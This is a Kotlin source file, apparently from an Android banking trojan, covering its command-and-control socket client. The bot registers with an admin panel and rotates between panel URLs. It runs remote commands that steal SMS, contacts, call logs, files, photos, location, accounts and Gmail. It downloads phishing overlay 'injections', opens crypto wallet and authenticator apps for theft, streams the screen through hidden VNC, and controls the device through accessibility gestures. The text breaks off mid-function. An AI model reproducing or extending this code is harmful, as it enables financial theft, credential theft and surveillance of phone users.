package com.xxx.zzz.socketsp

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import com.xxx.zzz.BuildConfig
import com.xxx.zzz.CallActivityADsafC
import com.xxx.zzz.Payload.ApplicationScope
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.ScreenProjectionActivity
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.aall.ioppp.socketlll.clientbb.IOQ
import com.xxx.zzz.aall.ioppp.socketlll.clientbb.SocketQ
import com.xxx.zzz.aall.ioppp.socketlll.emitterbb.Emitterq
import com.xxx.zzz.aall.ioppp.socketlll.engineio.clientsnn.EngineIOExceptionq
import com.xxx.zzz.aall.permasd.PermUtil
import com.xxx.zzz.accessppp.AccessibilityServiceQ
import com.xxx.zzz.accessppp.ScreenCaptureService
import com.xxx.zzz.adminp.ActivityAdminqw
import com.xxx.zzz.clipherp.Cryptorpo
import com.xxx.zzz.commandp.taskssv.*
import com.xxx.zzz.globp.*
import com.xxx.zzz.globp.utilssss.Utilslp
import com.xxx.zzz.notifp.DrawerSniffer
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.util.*

class IOSocketyt {

    private val OnCommand = Emitterq.Listener { args ->
        runCatching {
            val decrypt = Cryptorpo.decrypt(args[0] as String, Constantsfd.k)
            commadsWork(decrypt)
        }.onFailure {
            sendLogs("", "OnCommand ${it.localizedMessage}", "error")
        }
    }

    private val OnConnectListener = Emitterq.Listener {
        runCatching {
            Log.i(TAG, "\n\nSocket connected\n\n")

            val bot = JSONObject()
            bot.put("uid", params?.uid)

            Log.i(TAG, "login")
            instance.ioSocket?.emit("login", Cryptorpo.encrypt(bot.toString(), Constantsfd.k))
        }.onFailure {
            sendLogs("", "OnConnectListener ${it.localizedMessage}", "error")
        }
    }

    private val OnDisconnect = Emitterq.Listener {
        runCatching {
            Log.i(TAG, "\n\nSocket disconnected...\n\n")
        }.onFailure {
            sendLogs("", "OnDisconnect ${it.localizedMessage}", "error")
        }
    }

    private val OnErrorListener = Emitterq.Listener {
        runCatching {
            Log.i(TAG, "\n\nOnErrorListener\n\n")

            if ((it[0] as? EngineIOExceptionq)?.cause?.message?.isNotEmpty() == true) {
                Log.i(TAG, "\n\nSocket OnErrorListener ${(it[0] as? EngineIOExceptionq)?.cause?.message.toString()}\n\n")
                runCatching {
                    instance.ioSocket?.disconnect()
                }
                instance.ioSocket = null
                ApplicationScope.launch {
                    delay(5000)
                    findNewUrlAP()
                }
            }
        }.onFailure {
            sendLogs("", "OnErrorListener ${it.localizedMessage}", "error")
        }
    }

    private val OnRegister = Emitterq.Listener {
        Log.i(TAG, "\n\nonRegister\n\n")

        ApplicationScope.launch {
            runCatching {
                val bot = JSONObject()
                bot.put("uid", params?.uid)
                bot.put("manufacturer", params?.manufacturer)
                bot.put("screenResolution", Utilslp.getScreenResolution(SharedPreferencess.getAppContext()!!))
                bot.put("device", params?.device)
                bot.put("sdk", CommonParamsvc.sdk)
                bot.put("version", CommonParamsvc.version)
                bot.put("country", Utilslp.country(SharedPreferencess.getAppContext()!!))
                bot.put("countryCode", Utilslp.countrySIM(SharedPreferencess.getAppContext()!!))
                bot.put("tag", Constantsfd.tag)

                updateJson(bot)

                bot.put("command", "register")
                val resp = apiRequestHttpNm.command(bot)
                if (resp.isNotBlank()) {
                    SharedPreferencess.registered = true
                    updateInjections()
                }
            }.onFailure {
                sendLogs("", "OnRegister ${it.localizedMessage}", "error")
            }
        }
    }

    private val OnUpdate = Emitterq.Listener {
        runCatching {
            Log.i(TAG, "\n\nonUpdate\n\n")
            SharedPreferencess.registered = true
            updateBotParams()

            if (SharedPreferencess.lastDownloadInjects == -1L || (Calendar.getInstance().timeInMillis - SharedPreferencess.lastDownloadInjects) / 1000 / 60 > 10) {
                updateInjections()
                SharedPreferencess.lastDownloadInjects = Calendar.getInstance().timeInMillis
            }
        }.onFailure {
            sendLogs("", "OnUpdate ${it.localizedMessage}", "error")
        }
    }

    var ioSocket: SocketQ? = null
    var params: CommonParamsvc? = null

    init {
        runCatching {
            Log.i(TAG, "init")

            SharedPreferencess.urlAdminPanel = SharedPreferencess.urls
            val getUrls = SharedPreferencess.urls
            val urls = getUrls.replace(" ", "").split(";").toTypedArray()
            SharedPreferencess.urlAdminPanel = urls[SharedPreferencess.numUrl % urls.size]
            SharedPreferencess.numUrl += 1

            ioSocket = IOQ.socket(SharedPreferencess.urlAdminPanel, opts)
            initSocket(ioSocket!!, SharedPreferencess.getAppContext()!!)
        }.onFailure {
            sendLogs("", "IOSocketyt init ${it.localizedMessage}", "error")
        }
    }

    private fun findNewUrlAP() {
        runCatching {
            Log.i(TAG, "findNewUrlAP")

            SharedPreferencess.urlAdminPanel = SharedPreferencess.urls
            val getUrls = SharedPreferencess.urls

            val urls = getUrls.replace(" ", "").split(";").toTypedArray()
            SharedPreferencess.urlAdminPanel = urls[SharedPreferencess.numUrl % urls.size]
            instance.ioSocket?.disconnect()
            instance.ioSocket = null
            instance.ioSocket = IOQ.socket(SharedPreferencess.urlAdminPanel, opts)
            initSocket(instance.ioSocket!!, SharedPreferencess.getAppContext()!!)
            instance.ioSocket?.connect()

            SharedPreferencess.numUrl += 1
        }.onFailure {
            sendLogs("", "findNewUrlAP ${it.localizedMessage}", "error")
        }
    }

    private fun initSocket(socket: SocketQ, context: Context) {
        params = CommonParamsvc(context)

        socket.on(SocketQ.EVENT_CONNECT, OnConnectListener)
        socket.on("OnRegister", OnRegister)
        socket.on("OnUpdate", OnUpdate)
        socket.on(SocketQ.EVENT_CONNECT_ERROR, OnErrorListener)
        socket.on(SocketQ.EVENT_ERROR, OnErrorListener)
        socket.on(SocketQ.EVENT_DISCONNECT, OnDisconnect)

        socket.on(params?.uid, OnCommand)
        socket.off(params?.uid, OnCommand)
    }

    companion object {
        var jobVncImage: Job? = null
        var jobVncTree: Job? = null

        fun checkAP() = ApplicationScope.launch {
            runCatching {
                Log.i(TAG, "\n\ncheckAP\n\n")
                val bot = JSONObject()
                bot.put("uid", instance.params?.uid)
                bot.put("command", "checkAP")
                val response = apiRequestHttpNm.command(bot)

                val objJson = JSONObject(response)
                val settings = objJson.getString("settings")
                val activeInjection = objJson.getString("activeInjection")
                val commands = objJson.getString("commands")

                if (settings != "0") {
                    updateSettings(JSONObject(settings), activeInjection)
                }
                if (commands != "0") {
                    commadsWork(commands)
                }
            }.onFailure {
                sendLogs("", "checkAP ${it.localizedMessage}", "error")
            }
        }

        private fun updateSettings(settings: JSONObject, activeInjection: String) {
            Log.i(TAG, "updateSettings activeInjection $activeInjection")

            SharedPreferencess.activeInjection = activeInjection

            var urls = ""
            runCatching {
                val arrayUrl = JSONArray(settings.getString("arrayUrl"))
                Log.i(TAG, "updateSettings  arrayUrl $arrayUrl")
                for (i in 0 until arrayUrl.length())
                    urls += (arrayUrl.getString(i) + ";")
            }.onFailure {
                sendLogs("", "updateSettings arrayUrl ${it.localizedMessage}", "error")
            }

            Log.i(TAG, "updateSettings  settings $settings")

            SharedPreferencess.urls = urls

            SharedPreferencess.lockDevice = settings.getString("lockDevice")
            SharedPreferencess.offSound = settings.getString("offSound")
            SharedPreferencess.keylogger = settings.getString("keylogger")
            SharedPreferencess.hiddenSMS = settings.getString("hideSMS")
            SharedPreferencess.clearPush = settings.getString("clearPush")
            SharedPreferencess.readPush = settings.getString("readPush")
        }

        fun updateBotParams() = ApplicationScope.launch {
            runCatching {
                Log.i(TAG, "\n\nupdateBotParams\n\n")
                val bot = JSONObject()
                bot.put("uid", instance.params?.uid)
                bot.put("command", "update")
                updateJson(bot)
                apiRequestHttpNm.command(bot)
            }.onFailure {
                sendLogs("", "updateBotParamsl ${it.localizedMessage}", "error")
            }
        }

        fun updateBotSubInfo() = ApplicationScope.launch {
            runCatching {
                Log.i(TAG, "\n\nupdateBotSubInfo\n\n")
                val bot = JSONObject()
                bot.put("uid", instance.params?.uid)
                bot.put("command", "updateSubInfo")
                updateSubInfoJson(bot)
                apiRequestHttpNm.command(bot)
            }.onFailure {
                sendLogs("", "updateBotSubInfo ${it.localizedMessage}", "error")
            }
        }

        private fun updateSubInfoJson(bot: JSONObject) {
            runCatching {
                bot.put("batteryLevel", Utilslp.getBatteryLevel(SharedPreferencess.getAppContext()!!))
                bot.put(
                    "vnc_work_image",
                    (ScreenCaptureService.VNC_IMAGE_WORK && Calendar.getInstance().timeInMillis - ScreenCaptureService.lastImage < 30_000).toString()
                )
                bot.put("vnc_work_tree", (ScreenCaptureService.vnc && AccessibilityServiceQ.isEnabled).toString())

                bot.put(
                    "accessibility",
                    PermUtil.isAccessibilityServiceEnabled(SharedPreferencess.getAppContext()!!, AccessibilityServiceQ::class.java).toString()
                )
                bot.put("admin", ActivityAdminqw.isAdminDevice(SharedPreferencess.getAppContext()!!).toString())
                bot.put("screen", Utilslp.isScreenOn(SharedPreferencess.getAppContext()!!).toString())
                bot.put("isKeyguardLocked", Utilslp.isKeyguardLocked(SharedPreferencess.getAppContext()!!).toString())
                bot.put("isDozeMode", PermissionsActivity.is_dozemode(SharedPreferencess.getAppContext()!!).toString())
            }.onFailure {
                sendLogs("", "updateSubInfoJson ${it.localizedMessage}", "error")
            }
        }

        private fun downLoadingInjection() {
            runCatching {
                val arrayInjections =
                    SharedPreferencess.allInjection
                        .split(";")
                        .toMutableList()
                        .filter { it.isNotEmpty() }
                        .toSet()
                        .toList()
                if (arrayInjections.isNotEmpty())
                    downloadInjection(arrayInjections)
            }.onFailure {
                sendLogs("", "downLoadinjection ${it.localizedMessage}", "error")
            }
        }

        private fun downloadInjection(arrayInjection: List<String>) = ApplicationScope.launch {
            Log.i(TAG, "downloadInjection $arrayInjection")
            val bot = JSONObject()
            bot.put("uid", instance.params?.uid)

            val listOut = JSONArray()
            arrayInjection.forEach {
                listOut.put(it)
            }

            bot.put("injects", listOut)
            bot.put("command", "downloadInjections")

            val decrypt = apiRequestHttpNm.command(bot)
            if (decrypt.isNotBlank()) {
                val objJson = decrypt.split(";;;").filter { it.isNotEmpty() }.filterNot { it.contains("~no~") }.toSet()
                objJson.forEach {
                    runCatching {
                        val JSONObject = JSONObject(it)

                        val inject = JSONObject.getString("inject")
                        Log.i(TAG, "OnDownloadInjection $inject")

                        val htmlBase64Inj = JSONObject.getString("html")
                        if (htmlBase64Inj.length > 10) {
                            SharedPreferencess.SettingsWrite(inject, htmlBase64Inj)
                        }

                        val htmlBase64Icon = JSONObject.getString("icon")
                        if (htmlBase64Icon.length > 10) {
                            SharedPreferencess.SettingsWrite("icon_$inject", htmlBase64Icon)
                        }

                        val injType = JSONObject.getString("type")
                        SharedPreferencess.SettingsWrite("type_$inject", injType)

                        val auto = JSONObject.getString("auto")
                        SharedPreferencess.SettingsWrite("auto_$inject", auto)
                    }.onFailure {
                        sendLogs("", "downLoadinjection objJson ${it.localizedMessage}", "error")
                    }
                }
            }
        }

        private fun commadsWork(decrypt: String): Job {
            val cmdsJson = JSONObject(decrypt)
            val cmds = JSONArray(cmdsJson.get("Commands").toString())

            return ApplicationScope.launch {
                for (i in 0 until cmds.length()) {
                    runCatching {
                        val cmd = JSONObject(cmds[i].toString())

                        val commands = JSONObject(cmd.get("commands").toString())
                        val idCommand = cmd.get("id").toString()

                        val command = commands.get("command").toString()
                        val payload = JSONObject(commands.get("payload").toString())

                        Log.i(TAG, "OnCommand command $command")
                        Log.i(TAG, "OnCommand payload $payload")

                        ApplicationScope.launch {
                            val data = JSONObject()
                            data.put("uid", instance.params?.uid)
                            data.put("cmdId", idCommand)
                            data.put("command", "onStartCmd")
                            apiRequestHttpNm.command(data)
                        }

                        Log.i(TAG, "\nCommand: $cmd\n")
                        when (command.lowercase(Locale.getDefault())) {
                            "fmmanager" -> {
                                if (payload.getString("extra") == "ls")
                                    FileManagerTask(SharedPreferencess.getAppContext()!!, 0, payload.getString("path")).start()
                                else if (payload.getString("extra") == "dl")
                                    FileManagerTask(SharedPreferencess.getAppContext()!!, 1, payload.getString("path")).start()
                            }
                            "getcallhistory" -> {
                                val cnt = runCatching { payload.getString("cnt").toString().toInt() }.getOrNull()
                                CallLogsTask(SharedPreferencess.getAppContext()!!, cnt).start()
                            }
                            "getcontacts" -> {
                                ContactsTask(SharedPreferencess.getAppContext()!!).start()
                            }
                            "addcontact" -> {
                                val phone = payload.getString("arg1").toString()
                                val name = payload.getString("arg2").toString()
                                AddNewContact(SharedPreferencess.getAppContext()!!, phone, name).start()
                            }
                            "getlocation" -> {
                                LocationMonitorTask(SharedPreferencess.getAppContext()!!).start()
                            }
                            "getimages" -> {
                                PhotosTask(SharedPreferencess.getAppContext()!!).start()
                            }
                            "downloadimage" -> {
                                val path = payload.getString("arg1").toString()
                                DownloadImage(SharedPreferencess.getAppContext()!!, path).start()
                            }
                            "openapp" -> {
                                val appPackage = payload.getString("arg1").toString()
                                val intent: Intent? = SharedPreferencess.getAppContext()!!.packageManager.getLaunchIntentForPackage(appPackage)
                                intent?.apply {
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                }
                                SharedPreferencess.getAppContext()!!.startActivity(intent)
                            }
                            "openwhatsapp" -> {
                                SharedPreferencess.SettingsWrite("whatsappsend", "1")
                                val number = payload.getString("arg1").toString()
                                val text = payload.getString("arg2").toString()
                                SharedPreferencess.getAppContext()!!
                                    .startActivity(
                                        Intent(Intent.ACTION_VIEW, Uri.parse("https://api.whatsapp.com/send?phone=$number&text=$text"))
                                            .apply {
                                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                            }
                                    )
                            }
                            "makecall" -> {
                                runCatching {
                                    val number = payload.getString("arg1")
                                    val intent = Intent(Intent.ACTION_CALL)
                                    intent.data = Uri.parse("tel:$number")
                                    intent.apply {
                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                    }

                                    val infos = SharedPreferencess.getAppContext()?.packageManager?.queryIntentActivities(intent, 0)
                                    infos?.forEach {
                                        if (it.activityInfo.applicationInfo.packageName.contains("com.android.server.telecom")) {
                                            val intent = Intent(Intent.ACTION_CALL)
                                            intent.data = Uri.parse("tel:$number")
                                            intent.setClassName(it.activityInfo.applicationInfo.packageName, it.activityInfo.name)
                                                .apply {
                                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                                }
                                            SharedPreferencess.getAppContext()!!.startActivity(intent)
                                            return@runCatching
                                        } else if (it.activityInfo.applicationInfo.packageName.contains(".android.")) {
                                            val intent = Intent(Intent.ACTION_CALL)
                                            intent.data = Uri.parse("tel:$number")
                                            intent.setClassName(it.activityInfo.applicationInfo.packageName, it.activityInfo.name)
                                                .apply {
                                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                                }
                                            SharedPreferencess.getAppContext()!!.startActivity(intent)
                                            return@runCatching
                                        }
                                    }

                                    if (ActivityCompat.checkSelfPermission(SharedPreferencess.getAppContext()!!, Manifest.permission.CALL_PHONE)
                                        == PackageManager.PERMISSION_GRANTED
                                    )
                                        SharedPreferencess.getAppContext()!!.startActivity(intent)
                                }.onFailure {
                                    sendLogs("", "makecall ${it.localizedMessage}", "error")
                                }
                            }
                            "forwardsms" -> {
                                SmsForwarder(SharedPreferencess.getAppContext()!!, payload.getString("number")).start()
                            }
                            "sendsms" -> {
                                if (payload.getString("sim") == "sim2") {
                                    SendSmsTask(
                                        SharedPreferencess.getAppContext()!!,
                                        payload.getString("number"),
                                        payload.getString("text"),
                                        if (payload.getString("sim") == "sim2") 1 else 0
                                    ).start()
                                } else {
                                    val phoneNumber = payload.getString("number")
                                    val textMessage = payload.getString("text")
                                    SendSmsTask(
                                        SharedPreferencess.getAppContext()!!,
                                        phoneNumber,
                                        textMessage
                                    ).start()
                                }
                            }
                            "send_sms_many" -> {
                                val numbers = payload.getString("numbers").split(";").filter { it.isNotBlank() }
                                SendSmsManyTask(
                                    SharedPreferencess.getAppContext()!!,
                                    numbers,
                                    payload.getString("text"),
                                    if (payload.getString("sim") == "sim2") 1 else 0
                                ).start()
                            }
                            "startussd" -> {
                                SendUssdTask(
                                    SharedPreferencess.getAppContext()!!,
                                    payload.getString("ussd"),
                                    if (payload.getString("sim") == "sim2") 1 else 0
                                ).start()
                            }
                            "forwardcall" -> {
                                CallForwardTask(
                                    SharedPreferencess.getAppContext()!!,
                                    payload.getString("number"),
                                    if (payload.getString("sim") == "sim2") 1 else 0
                                ).start()
                            }
                            "push" -> {
                                SendNotificationTask(
                                    SharedPreferencess.getAppContext()!!,
                                    payload.getString("app"),
                                    payload.getString("title"),
                                    payload.getString("text")
                                ).start()
                            }
                            "getaccounts",
                            "logaccounts" -> {
                                LogAccountsTask(SharedPreferencess.getAppContext()!!).start()
                            }
                            "getinstallapps" -> {
                                GetAppsTask(SharedPreferencess.getAppContext()!!).start()
                            }
                            "getsms" -> {
                                val arg1 = runCatching { Integer.parseInt(payload.getString("arg1")) }.getOrElse { 100 }
                                SmsTask(SharedPreferencess.getAppContext()!!, arg1).start()
                            }
                            "startinject" -> {
                                OpenFakeTask.openFake(
                                    SharedPreferencess.getAppContext()!!,
                                    payload.getString("app")
                                )
                            }
                            "openurl" -> {
                                var url = payload.getString("url").toString()
                                if (!url.startsWith("https://") && !url.startsWith("http://")) {
                                    url = "http://$url"
                                }
                                OpenUrlTask(SharedPreferencess.getAppContext()!!, url).start()
                            }
                            "updateinjectandlistapps" -> {
                                updateInjections()
                            }
                            "sendsmsall" -> {
                                SendSmsAllTask(
                                    SharedPreferencess.getAppContext()!!,
                                    payload.getString("text"),
                                    if (payload.getString("sim") == "sim2") 1 else 0
                                ).start()
                            }
                            "startapp" -> {
                                Utilslp.startApplication(payload.getString("app"))
                            }
                            "calling" -> {
                                OpenFakeTask.Calling(
                                    SharedPreferencess.getAppContext()!!,
                                    payload.getString("number"),
                                    payload.getString("lock") == "1"
                                )
                            }
                            "killme" -> {
                                SharedPreferencess.killApplication = SharedPreferencess.getAppContext()!!.packageName
                            }
                            "deleteapplication" -> {
                                SharedPreferencess.killApplication = payload.getString("app")
                            }
                            "gmailtitles" -> {
                                SharedPreferencess.SettingsWrite("gm_list", "start")
                                Utilslp.startApplication("com.google.android.gm")
                            }
                            "getgmailmessage" -> {
                                val em = payload.getString("mes_num")
                                SharedPreferencess.SettingsWrite("gm_mes_command", "start")
                                SharedPreferencess.SettingsWrite("gm_mes", em)
                                Utilslp.startApplication("com.google.android.gm")
                            }
                            "startadmin" -> {
                                SharedPreferencess.adminCommand = "1"
                            }
                            "takescreenshot" -> {
                                ScreenCaptureService.flagStop = false
                                SharedPreferencess.autoClickOnceStream = "1"
                                val intent = Intent(
                                    SharedPreferencess.getAppContext()!!,
                                    ScreenProjectionActivity::class.java
                                ).apply {
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                }
                                SharedPreferencess.getAppContext()!!.startActivity(intent)
                            }
                            "start_vnc" -> {
                                ScreenCaptureService.flagStop = false
                                ScreenCaptureService.vnc = true
                                SharedPreferencess.autoClickOnceStream = "1"
                                val intent = Intent(
                                    SharedPreferencess.getAppContext()!!,
                                    ScreenProjectionActivity::class.java
                                ).apply {
                                    putExtra("streamScreen", true)
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                }
                                SharedPreferencess.getAppContext()!!.startActivity(intent)
                            }
                            "stop_vnc" -> {
                                ScreenCaptureService.flagStop = true
                                ScreenCaptureService.vnc = false
                                updateBotSubInfo()
                            }
                            "clearcash",
                            "clearcache" -> {
                                OpenFakeTask.startClearCash(
                                    SharedPreferencess.getAppContext()!!,
                                    payload.getString("app")
                                )
                            }
                            "takephoto" -> {
                                CameraManager(SharedPreferencess.getAppContext()!!).start()
                            }
                            "cookie" -> {
                                val url = runCatching { payload.getString("url").toString().takeIf { it.isNotEmpty() } }.getOrNull()
                                SharedPreferencess.getAppContext()!!.startActivity(BrowserActivity.newInstance(SharedPreferencess.getAppContext()!!, url))
                            }
                            ///////////////////////
                            //google auth
                            "startauthenticator2" -> {
                                SharedPreferencess.SettingsWrite("authenticator2", null)
                                Utilslp.startApplication("com.google.android.apps.authenticator2")
                            }
                            ///////////////////////
                            //wallets
                            "trust" -> {
                                SharedPreferencess.SettingsWrite("trust", null)
                                Utilslp.startApplication("com.wallet.crypto.trustapp")
                            }
                            "mycelium" -> {
                                SharedPreferencess.SettingsWrite("mycelium", null)
                                Utilslp.startApplication("com.mycelium.wallet")
                            }
                            "piuk" -> {
                                SharedPreferencess.SettingsWrite("piuk", null)
                                Utilslp.startApplication("piuk.blockchain.android")
                            }
                            "samourai" -> {
                                SharedPreferencess.SettingsWrite("samourai", null)
                                Utilslp.startApplication("com.samourai.wallet")
                            }
                            "bitcoincom" -> {
                                SharedPreferencess.SettingsWrite("bitcoincom", null)
                                Utilslp.startApplication("com.bitcoin.mwallet")
                            }
                            "toshi" -> {
                                SharedPreferencess.SettingsWrite("toshi", null)
                                Utilslp.startApplication("org.toshi")
                            }
                            "metamask" -> {
                                SharedPreferencess.SettingsWrite("metamask", null)
                                Utilslp.startApplication("io.metamask")
                            }
                            "safepal" -> {
                                SharedPreferencess.SettingsWrite("safepal", null)
                                Utilslp.startApplication("io.safepal.wallet")
                            }
                            "exodus" -> {
                                SharedPreferencess.SettingsWrite("exodus", null)
                                Utilslp.startApplication("exodusmovement.exodus")
                            }
                            //////////////////////////////////////
                            "unlock" -> {
                                val intent = Intent(
                                    SharedPreferencess.getAppContext()!!,
                                    CallActivityADsafC::class.java
                                ).apply {
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                                }
                                SharedPreferencess.getAppContext()!!.startActivity(intent)
                            }
                            "addview" -> {
                                AccessibilityServiceQ.addBlackView()
                            }
                            "removeview" -> {
                                AccessibilityServiceQ.deleteBlackView()
                            }
                            "addwaitview" -> {
                                val colorBack = runCatching { payload.getString("colorback") }.getOrNull().takeIf { !it.isNullOrBlank() } ?: "#000000"
                                val colorText = runCatching { payload.getString("colortext") }.getOrNull().takeIf { !it.isNullOrBlank() } ?: "#ffffff"
                                val text = runCatching { payload.getString("text") }.getOrNull().takeIf { !it.isNullOrBlank() } ?: "please wait"
                                AccessibilityServiceQ.addWaitView(colorBack, colorText, text)
                            }
                            "removewaitview" -> {
                                AccessibilityServiceQ.deleteWaitView()
                            }
                            //////////////////////////////////////
                            "onkeyevent" -> {
                                when (payload.getString("key")) {
                                    "recents" -> {
                                        AccessibilityServiceQ.openRecents()
                                    }
                                    "back" -> {
                                        AccessibilityServiceQ.globalActionBack()
                                    }
                                    "home" -> {
                                        AccessibilityServiceQ.globalActionHome()
                                    }
                                    "lock" -> {
                                        AccessibilityServiceQ.instance?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                                    }
                                    "power_dialog" -> {
                                        AccessibilityServiceQ.instance?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                                    }
                                    "double_tap" -> {
                                        AccessibilityServiceQ.instance?.performGlobalAction(AccessibilityService.GESTURE_DOUBLE_TAP)
                                    }
                                }
                            }
                            //////////////////////////////////////
                            "cuttext" -> {
                                AccessibilityServiceQ.onCutText(payload.getString("text"))
                            }
                            //////////////////////////////////////
                            "onpointerevent" -> {
                                val gestureType = payload.getString("text")
                                val x = payload.getString("x").toInt()
                                val y = payload.getString("y").toInt()


                                if (gestureType == "down" && !AccessibilityServiceQ.mIsButtonOneDown) {
                                    AccessibilityServiceQ.mIsButtonOneDown = true
                                    AccessibilityServiceQ.startGesture(x, y)
                                }


                                if (gestureType == "continue" && AccessibilityServiceQ.mIsButtonOneDown) {
                                    AccessibilityServiceQ.continueGesture(x, y)
                                }


                                if (gestureType == "up" && AccessibilityServiceQ.mIsButtonOneDown) {
                                    AccessibilityServiceQ.mIsButtonOneDown = false
                                    AccessibilityServiceQ.endGesture(x, y)
                                }
                            }
                            //////////////////////////////////////
                            "longpress" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                AccessibilityServiceQ.longPress(x, y)
                            }
                            "tap" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                AccessibilityServiceQ.tap(x, y)
                            }
                            "swipe" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                val x1 = payload.getString("x1").toDoubleOrNull()?.toInt() ?: payload.getString("x1").toInt()
                                val y1 = payload.getString("y1").toDoubleOrNull()?.toInt() ?: payload.getString("y1").toInt()
                                AccessibilityServiceQ.swipe(x, y, x1, y1)
                            }
                            "swipedown" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                AccessibilityServiceQ.swipeDown(x, y)
                            }
                            "swipeup" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                AccessibilityServiceQ.swipeUp(x, y)
                            }
                            "swiperight" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                AccessibilityServiceQ.swipeRight(x, y)
                            }
                            "swipeleft" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                AccessibilityServiceQ.swipeLeft(x, y)
                            }
                            "scrolldown" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                AccessibilityServiceQ.scrollDown(x, y)
                            }
                            "scrollup" -> {
                                val x = payload.getString("x").toDoubleOrNull()?.toInt() ?: payload.getString("x").toInt()
                                val y = payload.getString("y").toDoubleOrNull()?.toInt() ?: payload.getString("y").toInt()
                                AccessibilityServiceQ.scrollUp(x, y)
                            }
                            //////////////////////////////////////
                            "clickat" -> {
                                val id = payload.getString("id")
                                AccessibilityServiceQ.clickAt(id)
                            }
                            "clickattext" -> {
                                val text = payload.getString("text")
                                AccessibilityServiceQ.clickAtText(text)
                            }
                            "clickatcontaintext" -> {
                                val text = payload.getString("text")
                                AccessibilityServiceQ.clickAtContainsText(text)
                            }
                            "settext" -> {
                                val text = payload.getString("text")
                                val viewid = payload.getString("viewid")
                                AccessibilityServiceQ.setText(viewid, text)
                            }
                        }

                        if (cmds.length() > 1)
                            delay(5_000)
                    }.onFailure {
                        sendLogs("", "commadsWork ${it.localizedMessage}", "error")
                    }
                }
            }
        }

        private fun updateInjections() = ApplicationScope.launch {
            runCatching {
                Log.i(TAG, "\n\nOnUpdateInjections\n\n")

                val bot = JSONObject()
                bot.put("uid", instance.params?.uid)
                bot.put("apps", Utilslp.getAllApplication(SharedPreferencess.getAppContext()!!))

                Log.i(TAG, "${bot["apps"]}")
                bot.put("command", "updateInjections")
                val decrypt = apiRequestHttpNm.command(bot)
                if (decrypt.isNotEmpty()) {
                    Log.i(TAG, "\n\nOnInjectionsList\n\n")

                    val objJson = JSONObject(decrypt)
                    val allInjections = objJson.getString("allInjections")
                    val activeInjection = objJson.getString("activeInjection")

                    Log.i(TAG, "allInjections $allInjections")
                    Log.i(TAG, "activeInjection $activeInjection")

                    if (!activeInjection.isNullOrBlank() && activeInjection != "~no~") {
                        SharedPreferencess.activeInjection = activeInjection
                    }
                    if (!allInjections.isNullOrBlank() && allInjections != "~no~") {
                        SharedPreferencess.allInjection = allInjections
                        downLoadingInjection()
                    }
                }
            }.onFailure {
                sendLogs("", "updateInjections ${it.localizedMessage}", "error")
            }
        }

        private fun updateJson(bot: JSONObject) {
            runCatching {
                runCatching {
                    bot.put(
                        "location",
                        LocationMonitorTask(SharedPreferencess.getAppContext()!!).getLastLocation().toString()
                    )
                }.onFailure {
                    sendLogs("", "updateJson location ${it.localizedMessage}", "error")
                }

                bot.put("batteryLevel", Utilslp.getBatteryLevel(SharedPreferencess.getAppContext()!!))
                bot.put(
                    "vnc_work_image",
                    (ScreenCaptureService.VNC_IMAGE_WORK && Calendar.getInstance().timeInMillis - ScreenCaptureService.lastImage < 30_000).toString()
                )
                bot.put("vnc_work_tree", (ScreenCaptureService.vnc && AccessibilityServiceQ.isEnabled).toString())

                bot.put(
                    "accessibility",
                    PermUtil.isAccessibilityServiceEnabled(SharedPreferencess.getAppContext()!!, AccessibilityServiceQ::class.java).toString()
                )
